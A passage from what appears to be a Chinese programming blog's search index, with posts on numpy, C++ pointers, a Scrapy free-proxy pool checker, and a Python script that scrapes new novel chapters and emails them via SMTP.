class="line">total = np.add(chinese,english,math)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(total)</span><br></pre></td></tr></table></figure><pre><code>[131 180 185 178 170]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c_a,e_a,m_a = np.average(chinese),np.average(english),np.average(math)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(c_a)</span><br></pre></td></tr></table></figure><pre><code>84.8</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>小说更新后发送邮箱的问题解决</title>
      <link href="/2018/11/23/%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E5%90%8E%E5%8F%91%E9%80%81%E9%82%AE%E7%AE%B1%E7%9A%84%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
      <url>/2018/11/23/%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E5%90%8E%E5%8F%91%E9%80%81%E9%82%AE%E7%AE%B1%E7%9A%84%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul><li>先上一张图，看一下问题在哪<br><img src="/2018/11/23/小说更新后发送邮箱的问题解决/1.png" alt="1.png"></li></ul><p>从图上我们可以看到，虽然小说是每天发两次给我，但是有时候会漏掉一章，有时候又会重复发一章，这都是小说作者不按时更新惹的祸啊！！！既然小说作者的习惯改变不了，那就完善自我吧!</p><h2 id="新的思路，加一个“缓存”"><a href="#新的思路，加一个“缓存”" class="headerlink" title="新的思路，加一个“缓存”"></a>新的思路，加一个“缓存”</h2><p>缓存是什么意思呢？</p><ul><li>本地建一个名为origin.txt的文本文件，每次爬取完成后与origin.txt里面的内容对比一下。</li><li>如果一样则不发送。</li><li>如果不一样就发送，并且将最新的内容保存到origin.txt文件中，作为下一次的对照。</li></ul><h2 id="演示效果"><a href="#演示效果" class="headerlink" title="演示效果"></a>演示效果</h2><ul><li>再origin.txt里写入test，然后启动<br><img src="/2018/11/23/小说更新后发送邮箱的问题解决/2.png" alt="2.png"><br>我们可以看到，origin文件已被重新写入，并且新的文本已经发送到邮箱</li><li>再次启动，也就是还没跟新的情况<br><img src="/2018/11/23/小说更新后发送邮箱的问题解决/3.png" alt="3"><br>我们看到，提示消息，这里不会跟新origin，也不会发送邮件</li></ul><h2 id="还遗留的问题"><a href="#还遗留的问题" class="headerlink" title="还遗留的问题"></a>还遗留的问题</h2><ul><li>如果作者一下爆发怎么办（一分钟更新十章！）<br>思考一下，其实原理差不多，缓存大小不同罢了！有兴趣的可以尝试一下！<h2 id="项目源码已发布在github"><a href="#项目源码已发布在github" class="headerlink" title="项目源码已发布在github"></a>项目源码已发布在github</h2><a href="https://github.com/huzai9527/fictionSend" target="_blank" rel="noopener">https://github.com/huzai9527/fictionSend</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>c++指针问题</title>
      <link href="/2018/11/19/c-%E6%8C%87%E9%92%88%E9%97%AE%E9%A2%98/"/>
      <url>/2018/11/19/c-%E6%8C%87%E9%92%88%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="指针究竟是什么"><a href="#指针究竟是什么" class="headerlink" title="指针究竟是什么"></a>指针究竟是什么</h2><ul><li>指针是一类特殊的变量，他保存的不是一般数据的值，而是程序中另一对象在内存中的地址<br>我们先通过一个小程序看一看指针如何工作<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">int n = 123,m = 456;</span><br><span class="line">int *p = &amp;n;</span><br><span class="line">cout&lt;&lt;<span class="string">"&amp;n:"</span>&lt;&lt;&amp;n&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="string">"&amp;p:"</span>&lt;&lt;&amp;p&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="string">" p:"</span>&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="string">"*p:"</span>&lt;&lt;*p&lt;&lt;endl;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/11/19/c-指针问题/1.png" alt="1"><br>从运行结果可以看出下面几点：</p><ul><li>p本身是有一个地址的且地址为 <strong>&amp;p</strong></li><li>p的值是另一个变量n的地址 <strong>&amp;n</strong></li><li>*p所表示的意思是地址为 <strong>p</strong> 的内存中所存的值 <strong>n</strong></li><li>即本段程序中共涉及到2个地址，一个是 <strong>n</strong> 的地址，一个是 <strong>p</strong> 的地址,我们用一张图来表示他们的关系<br><img src="/2018/11/19/c-指针问题/2.png" alt="2"><h2 id="指针的初始化"><a href="#指针的初始化" class="headerlink" title="指针的初始化"></a>指针的初始化</h2></li><li><p>被具有相同类型的对象初始化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int i = 10;</span><br><span class="line">int *p = &amp;i;</span><br></pre></td></tr></table></figure></li><li><p>由另一个同一类型的指针初始化,这时两个指针指向同一地址空间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int *p1 = p;</span><br></pre></td></tr></table></figure></li><li><p>通过直接分配内存地址得到初值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int *p2 = new int;</span><br></pre></td></tr></table></figure></li><li><p>指针也可以没有类型，通用指针的定义,这样的指针可以指向任一对象</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *p3</span><br></pre></td></tr></table></figure></li></ul><h2 id="指针的运算符"><a href="#指针的运算符" class="headerlink" title="指针的运算符"></a>指针的运算符</h2><p>定义指针的目的事通过指针变量间接的访问变量</p><ul><li><strong>*</strong>:取指针值运算符。通过指针所指内存单元的地址间接的访问对应的存储单元。若指针变量p指向变量a，则 *p的运算结果为变量a的值</li><li><p><strong>&amp;</strong>:取地址运算符。返回变量对应的存储单元地址，若a为int变量，p为int型指针变量，则 p = &amp;a表示将a的存储单元地址赋给p。<br>用一个程序验证一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line"> int a = 100;</span><br><span class="line"> int *p,*p1,*q;</span><br><span class="line"> p = &amp;a;</span><br><span class="line"> p1 = p;</span><br><span class="line"> q = NULL;</span><br><span class="line"> cout&lt;&lt;<span class="string">"a="</span>&lt;&lt;a&lt;&lt;<span class="string">","</span>&lt;&lt;<span class="string">"*p="</span>&lt;&lt;*p&lt;&lt;<span class="string">","</span>&lt;&lt;<span class="string">"p="</span>&lt;&lt;p&lt;&lt;endl;</span><br><span class="line"> *p1 = 200;</span><br><span class="line"> cout&lt;&lt;<span class="string">"a="</span>&lt;&lt;a&lt;&lt;<span class="string">","</span>&lt;&lt;<span class="string">"*p="</span>&lt;&lt;*p&lt;&lt;<span class="string">","</span>&lt;&lt;<span class="string">"p="</span>&lt;&lt;p&lt;&lt;endl;</span><br><span class="line"> cout&lt;&lt;<span class="string">"*p1="</span>&lt;&lt;*p1&lt;&lt;<span class="string">","</span>&lt;&lt;<span class="string">"p1="</span>&lt;&lt;p1&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>运行结果<br><img src="/2018/11/19/c-指针问题/3.png" alt="3.png"></p><h2 id="指针与数组的关系"><a href="#指针与数组的关系" class="headerlink" title="指针与数组的关系"></a>指针与数组的关系</h2></li><li>数组名和指针在引用数组元素和取他们的地址方面可以相互转换，但两者有一个重要的不同点</li><li><p>数组是在定义时就分配好内存空间的，因此数组名是一个地址常量，在程序中不能将数组名作为变量为其赋值，而指针是一个变量，可以多次赋值<br>我们通过一个程序看一下他们的关系</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">int a[10]=&#123;1,2,3,4,5,6,7,8,9,10&#125;;</span><br><span class="line">int *pa = a;</span><br><span class="line">int i = 3;</span><br><span class="line">cout&lt;&lt;<span class="string">"a[i]   :"</span>&lt;&lt;a[i]&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="string">"*(pa+i):"</span>&lt;&lt;*(pa+i)&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="string">"*(a+i) :"</span>&lt;&lt;*(a+i)&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="string">"&amp;a[i]  :"</span>&lt;&lt;&amp;a[i]&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="string">"a+i    :"</span>&lt;&lt;a+i&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="string">"pa+i   :"</span>&lt;&lt;pa+i&lt;&lt;endl;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>运行结果<br><img src="/2018/11/19/c-指针问题/4.png" alt="4"></p><h2 id="易重要的和易混淆的概念"><a href="#易重要的和易混淆的概念" class="headerlink" title="易重要的和易混淆的概念"></a>易重要的和易混淆的概念</h2></li><li>为什么要对指针初始化？<br>定义了指针变量后，系统会为其分配一个内存空间，若没有赋值则此内存区域的内容是随机的，也就是指针随机指向一个内存单元。你想想如果你对一个随机的内存空间进行写操作，会怎样！</li><li>指针的运算<br>指针 + 整数 = 指针<br>指针 - 指针 = 整数 //同类行的指针相减表示两个基类型变量的个数<br>指针 + 指针 = ？？？？ //不可以</li><li><p>new、 new[]、 delete、 delete[]有什么区别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int *p = new int(3) // 为p分配了一个整形变量的存储区域并初始化为3</span><br><span class="line">int *p1 = new int[20] // 分配20个整形变量的区域给p1</span><br><span class="line">delete p //释放有new申请的空间</span><br><span class="line">delete[] p1 //释放由new[]申请的空间</span><br></pre></td></tr></table></figure></li><li><p>c++程序中动态分配的内存不会被自动释放</p></li><li>指针函数和函数指针含义相同吗？<br>完全不同！<br>指针函数：若一个函数返回的是一个地址，则称该函数为指针函数。格式是 数据类型<em> 函数名（参数列表）<br>函数指针：指针变量指向一个函数的入口地址，格式为 数据类型 （</em>函数指针变量）（参数列表）<br>函数指针的用法：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int cul(int (*pf)(int,int), int x, int y)&#123;</span><br><span class="line"><span class="built_in">return</span> pf(x,y);</span><br><span class="line">&#125;</span><br><span class="line">int add(int x,int y)&#123;</span><br><span class="line"><span class="built_in">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line">int sub(int x,int y)&#123;</span><br><span class="line"><span class="built_in">return</span> x-y;</span><br><span class="line">&#125;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">int a=10,b=20;</span><br><span class="line">cout&lt;&lt;a&lt;&lt;<span class="string">"+"</span>&lt;&lt;b&lt;&lt;<span class="string">"="</span>&lt;&lt;cul(add,a,b)&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;a&lt;&lt;<span class="string">"-"</span>&lt;&lt;b&lt;&lt;<span class="string">"="</span>&lt;&lt;cul(sub,a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/11/19/c-指针问题/5.png" alt="5"></p><ul><li>常量指针、指针常量、指向常量的指针常量有什么区别<br>常量指针：表示指针指向的是一个常量，格式：const 类型<em> 指针变量 或 类型 const </em> 指针变量<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int i;</span><br><span class="line">const int *p = &amp;i;</span><br><span class="line">*p = 10; //错误</span><br><span class="line">i = 10; //正确</span><br></pre></td></tr></table></figure></li></ul><p>指针常量：表示所定义的指针是一个常量，只能在定义的时候初始化<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int i,j;</span><br><span class="line">int * const p = &amp;i;</span><br><span class="line">p = &amp;j;//错误</span><br></pre></td></tr></table></figure></p><p>指向常量的指针常量：格式为 const 类型 * const 指针常量<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int i,j;</span><br><span class="line">const int * const p = &amp;i;</span><br><span class="line">*p = 10;//错误</span><br><span class="line">p = &amp;j;//错误</span><br><span class="line">i = 10;//正确</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>scrapy构建自己的ip代理池</title>
      <link href="/2018/11/18/scrapy%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84ip%E4%BB%A3%E7%90%86%E6%B1%A0/"/>
      <url>/2018/11/18/scrapy%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84ip%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="用scrapy爬取可用的代理"><a href="#用scrapy爬取可用的代理" class="headerlink" title="用scrapy爬取可用的代理"></a>用scrapy爬取可用的代理</h1><h2 id="分析免费代理网站的结构"><a href="#分析免费代理网站的结构" class="headerlink" title="分析免费代理网站的结构"></a>分析免费代理网站的结构</h2><ul><li>我爬取了三个字段：<strong>IP</strong>、<strong>port</strong>、<strong>type</strong><br><img src="https://i.loli.net/2018/11/18/5bf12dc61a906.jpg" alt="TIM图片20181118171534.jpg"><h2 id="分析要爬取的数据，编写items-py"><a href="#分析要爬取的数据，编写items-py" class="headerlink" title="分析要爬取的数据，编写items.py"></a>分析要爬取的数据，编写items.py</h2></li><li>因此在items.py中，建立相应的字段<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import scrapy</span><br><span class="line">class IproxyItem(scrapy.Item):</span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    ip = scrapy.Field()</span><br><span class="line">    <span class="built_in">type</span> = scrapy.Field()</span><br><span class="line">    port = scrapy.Field()</span><br></pre></td></tr></table></figure></li></ul><h2 id="爬取所有的免费ip"><a href="#爬取所有的免费ip" class="headerlink" title="爬取所有的免费ip"></a>爬取所有的免费ip</h2><ul><li>在spider目录下，创建IpSpider.py<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import scrapy</span><br><span class="line">import Iproxy.items</span><br><span class="line">class IpSpider(scrapy.Spider):</span><br><span class="line">    name = <span class="string">'IpSpider'</span></span><br><span class="line">    allowed_domains = [<span class="string">'xicidaili.com'</span>]</span><br><span class="line">    start_urls = [<span class="string">'http://www.xicidaili.com/'</span>]</span><br><span class="line"></span><br><span class="line">    def parse(self, response):</span><br><span class="line">        item = Iproxy.items.IproxyItem()</span><br><span class="line">        item[<span class="string">'ip'</span>] = response.css(<span class="string">'tr td:nth-child(2)::text'</span>).extract()</span><br><span class="line">        item[<span class="string">'port'</span>] = response.css(<span class="string">'tr td:nth-child(3)::text'</span>).extract()</span><br><span class="line">        item[<span class="string">'type'</span>] = response.css(<span class="string">'tr td:nth-child(6) ::text'</span>).extract()</span><br><span class="line">        yield item</span><br></pre></td></tr></table></figure></li></ul><h2 id="检测是否可用，如果可用则存入数据库"><a href="#检测是否可用，如果可用则存入数据库" class="headerlink" title="检测是否可用，如果可用则存入数据库"></a>检测是否可用，如果可用则存入数据库</h2><ul><li>因为是免费的ip，所以我们有必要检测一下他是否可用，对于可用的就存入数据库，反之则丢弃</li><li>检测处理数据在pipeline.py中编写</li><li>检测原理，通过代理访问百度，如果能够访问，则说明可用<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define your item pipelines here</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don't forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class="line"><span class="comment"># See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"></span><br><span class="line">import pymysql</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">class IproxyPipeline(object):</span><br><span class="line">    def process_item(self, item, spider):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'</span>)</span><br><span class="line">        db = pymysql.connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"168168"</span>, <span class="string">"spider"</span>)</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(1, len(item[<span class="string">'ip'</span>])):</span><br><span class="line">            ip = item[<span class="string">'ip'</span>][i] + <span class="string">':'</span> + item[<span class="string">'port'</span>][i]</span><br><span class="line">            try:</span><br><span class="line">                <span class="keyword">if</span> self.proxyIpCheck(ip) is False:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">'此ip：'</span>+ip+<span class="string">"不能用"</span>)</span><br><span class="line">                    <span class="built_in">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">'此ip：'</span>+ip+<span class="string">'可用，存入数据库！'</span>)</span><br><span class="line">                    sql = <span class="string">'insert into proxyIp value ("%s")'</span> % (ip)</span><br><span class="line">                    cursor.execute(sql)</span><br><span class="line">                    db.commit()</span><br><span class="line">            except:</span><br><span class="line">                db.rollback()</span><br><span class="line">        db.close()</span><br><span class="line">        <span class="built_in">return</span> item</span><br><span class="line"></span><br><span class="line">    def proxyIpCheck(self, ip):</span><br><span class="line">        proxies = &#123;<span class="string">'http'</span>: <span class="string">'http://'</span> + ip, <span class="string">'https'</span>: <span class="string">'https://'</span> + ip&#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(<span class="string">'https://www.baidu.com/'</span>, proxies=proxies, timeout=1)</span><br><span class="line">            <span class="keyword">if</span> (r.status_code == 200):</span><br><span class="line">                <span class="built_in">return</span> True</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">return</span> False</span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">return</span> False</span><br></pre></td></tr></table></figure></li></ul><h2 id="运行情况"><a href="#运行情况" class="headerlink" title="运行情况"></a>运行情况</h2><ul><li>可以看出还是有好多ip不能用的<br><img src="https://i.loli.net/2018/11/18/5bf1308222b42.png" alt="TIM图片20181118172712.png"></li><li>可用的存在数据库<br><img src="https://i.loli.net/2018/11/18/5bf130d8031b3.jpg" alt="TIM图片20181118172841.jpg"></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> python scrapy 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python爬取最新更新的小说并发送到你的邮箱</title>
      <link href="/2018/11/17/python%E7%88%AC%E5%8F%96%E6%9C%80%E6%96%B0%E6%9B%B4%E6%96%B0%E7%9A%84%E5%B0%8F%E8%AF%B4%E5%B9%B6%E5%8F%91%E9%80%81%E5%88%B0%E4%BD%A0%E7%9A%84%E9%82%AE%E7%AE%B1/"/>
      <url>/2018/11/17/python%E7%88%AC%E5%8F%96%E6%9C%80%E6%96%B0%E6%9B%B4%E6%96%B0%E7%9A%84%E5%B0%8F%E8%AF%B4%E5%B9%B6%E5%8F%91%E9%80%81%E5%88%B0%E4%BD%A0%E7%9A%84%E9%82%AE%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<h2 id="数据获取—Spider"><a href="#数据获取—Spider" class="headerlink" title="数据获取—Spider()"></a>数据获取—Spider()</h2><h3 id="找目标网站，该网站是你看小说的网站，分析该网站的结构方便你对内容的抓取"><a href="#找目标网站，该网站是你看小说的网站，分析该网站的结构方便你对内容的抓取" class="headerlink" title="找目标网站，该网站是你看小说的网站，分析该网站的结构方便你对内容的抓取"></a>找目标网站，该网站是你看小说的网站，分析该网站的结构方便你对内容的抓取</h3><p>  <img src="https://i.loli.net/2018/11/17/5befc2f9dd2a9.png" alt="1.png"><br>  这里我获取最新章节的时间、标题以及标题的连接<br>  <img src="https://i.loli.net/2018/11/17/5befc38daf280.png" alt="2.png"><br>  这里获取内容</p><h3 id="编写spider方法，确定他的返回值，这里我返回的是一个list，包括更新的时间、标题、内容"><a href="#编写spider方法，确定他的返回值，这里我返回的是一个list，包括更新的时间、标题、内容" class="headerlink" title="编写spider方法，确定他的返回值，这里我返回的是一个list，包括更新的时间、标题、内容"></a>编写spider方法，确定他的返回值，这里我返回的是一个list，包括更新的时间、标题、内容</h3><ul><li>方法中需要导入的包 <strong>requests</strong> <strong>bs4</strong> <strong>re</strong> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def spider():</span><br><span class="line">    list = []</span><br><span class="line">    response = requests.get(<span class="string">'https://www.xbiquge6.com/13_13134/'</span>)</span><br><span class="line">    response.encoding = (<span class="string">'utf-8'</span>)</span><br><span class="line">    html = response.text</span><br><span class="line">    html = BeautifulSoup(html, <span class="string">'html.parser'</span>)</span><br><span class="line">    time = html.select(<span class="string">'div#info p:nth-of-type(3)'</span>).__getitem__(0).text[5:]</span><br><span class="line">    title = html.select(<span class="string">'div#info p:nth-of-type(4) a[href]'</span>).__getitem__(0).text</span><br><span class="line">    href = html.select(<span class="string">'div#info p:nth-of-type(4) a[href]'</span>).__getitem__(0)</span><br><span class="line">    <span class="comment"># print(title)</span></span><br><span class="line">    pattern = re.compile(r<span class="string">'href="(.+?)"'</span>)</span><br><span class="line">    href = re.findall(pattern, href.__str__()).__getitem__(0)</span><br><span class="line">    href = <span class="string">"https://www.xbiquge6.com"</span> + href</span><br><span class="line">    response = requests.get(href)</span><br><span class="line">    response.encoding = (<span class="string">'utf-8'</span>)</span><br><span class="line">    html = BeautifulSoup(response.text, <span class="string">'html.parser'</span>)</span><br><span class="line">    content = html.select(<span class="string">'div#content'</span>)</span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line">    list.append(title)</span><br><span class="line">    list.append(content)</span><br><span class="line">    list.append(time)</span><br><span class="line">    <span class="built_in">return</span> list</span><br></pre></td></tr></table></figure></li></ul><h2 id="邮件发送—smtp"><a href="#邮件发送—smtp" class="headerlink" title="邮件发送—smtp()"></a>邮件发送—smtp()</h2><h3 id="首先先在你的邮箱中设置打开smtp服务"><a href="#首先先在你的邮箱中设置打开smtp服务" class="headerlink" title="首先先在你的邮箱中设置打开smtp服务"></a>首先先在你的邮箱中设置打开smtp服务</h3><p>比如我的QQ邮箱，先进入邮箱-&gt;点击设置-&gt;点击账户-&gt;下滑找到smtp服务-&gt;点击开启服务-&gt;生成授权码（就是你在smtp方法中用到的password）<br>![PCO_6AO93%@2W$B}<a href="https://i.loli.net/2018/11/17/5befc49990bec.png" target="_blank" rel="noopener">GFGHI0 (1).png</a></p><h3 id="编写smtp方法，向我的邮箱发送小说，确定返回值是bool类型，成功为True，失败为False"><a href="#编写smtp方法，向我的邮箱发送小说，确定返回值是bool类型，成功为True，失败为False" class="headerlink" title="编写smtp方法，向我的邮箱发送小说，确定返回值是bool类型，成功为True，失败为False"></a>编写smtp方法，向我的邮箱发送小说，确定返回值是bool类型，成功为True，失败为False</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def mail():</span><br><span class="line">    list = spider();</span><br><span class="line">    ret = True</span><br><span class="line">    try:</span><br><span class="line">        mail_msg = list.__getitem__(1).__str__()</span><br><span class="line">        msg = MIMEText(mail_msg, <span class="string">'html'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line">        msg[<span class="string">'From'</span>] = formataddr([<span class="string">'huzai'</span>, my_sender])</span><br><span class="line">        msg[<span class="string">'To'</span>] = formataddr([<span class="string">'huzai'</span>, receiver])</span><br><span class="line">        msg[<span class="string">'Subject'</span>] = list.__getitem__(0)</span><br><span class="line">        server = smtplib.SMTP_SSL(<span class="string">'smtp.qq.com'</span>, 465)</span><br><span class="line">        server.login(my_sender, my_pwd)</span><br><span class="line">        server.sendmail(my_sender, [receiver], msg.as_string())</span><br><span class="line">        server.quit()</span><br><span class="line">    except Exception:</span><br><span class="line">        ret = False</span><br><span class="line">    <span class="built_in">return</span> ret</span><br></pre></td></tr></table></figure><h2 id="上传脚本到服务器"><a href="#上传脚本到服务器" class="headerlink" title="上传脚本到服务器"></a>上传脚本到服务器</h2><h3 id="使用xftp将写好的smtp-py上传到你的云服务器上"><a href="#使用xftp将写好的smtp-py上传到你的云服务器上" class="headerlink" title="使用xftp将写好的smtp.py上传到你的云服务器上"></a>使用xftp将写好的smtp.py上传到你的云服务器上</h3><p><img src="https://i.loli.net/2018/11/17/5befc6acf033d.png" 